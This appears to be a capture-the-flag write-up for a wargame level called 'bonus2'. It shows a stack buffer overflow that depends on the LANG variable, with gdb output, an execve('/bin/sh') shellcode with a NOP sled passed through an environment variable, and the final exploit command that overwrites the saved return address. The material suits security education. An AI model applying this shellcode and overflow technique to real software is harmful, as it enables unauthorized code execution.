In this level, our executable has two functions: `main()` and `greetuser()`.

The `main` function takes 2 arguments. It copies the first argument into a 40-byte buffer:

```bash
0x08048564 <+59>:	movl   $0x28,0x8(%esp)
```

Then it copies the second argument right after the first, and finally loads the environment variable `LANG`:

```bash
0x0804859f      c704243887..   mov dword [esp], str.LANG   ; [0x8048738:4]=0x474e414c ; "LANG"
```

There are comparisons of its return value with `fi` and `nl`. If it matches:

- `fi`: the program prints `Hyvää päivää`
- `nl`: it prints `Goedemiddag!`
- Otherwise: it defaults to `Hello`

After several tries without modifying the `LANG` variable, we don’t have enough characters to overwrite the EIP fully.

The EIP is located at `0xbffff6cc`:

```bash
Breakpoint 2 (0x08048528) pending.
(gdb) i f
Stack level 0, frame at 0xbffff6d0:
 eip = 0x804852f in main; saved eip 0xb7e454d3
 Arglist at 0xbffff6c8, args:
 Locals at 0xbffff6c8, Previous frame's sp is 0xbffff6d0
 Saved registers:
  ebp at 0xbffff6c8, eip at 0xbffff6cc
```

So we switch to `nl` with:

```bash
export LANG=nl
```

Now we can overwrite the EIP. We’ll replace its value with the address of a script passed via an environment variable (just like in `bonus0`).

Using the same shellcode (`execve(/bin/sh)`):

```bash
export SCRIPT=$(python -c 'print "\x90" * 80 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```

We find its address by inspecting the NOPs:

```bash
0xbffff906:	 "SCRIPT=\220\220\220\220\220\220\220\220\220\220..."
```

Memory dump confirms it:

```bash
(gdb) x/12wx 0xbffff906
0xbffff906:	0x49524353	0x903d5450	0x90909090	0x90909090
0xbffff916:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff926:	0x90909090	0x90909090	0x90909090	0x90909090
```

To place the address correctly in our second argument, we check how many characters precede the EIP. Here, we see that 23 `"B"` characters come before `0xbffff6cc`:

```bash
(gdb) x/20wx $eax
0xbffff580:	0x64656f47	0x64696d65	0x21676164	0x41414120
...
0xbffff5b0:	0x41414141	0x42424241	0x42424242	0x42424242
0xbffff5c0:	0x42424242	0x42424242	0x42424242	0xbffff926
```

So we send the following command:

```bash
./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 23 + "\x26\xf9\xff\xbf"')
```

Which gives us the penultimate flag of the ISO !!!
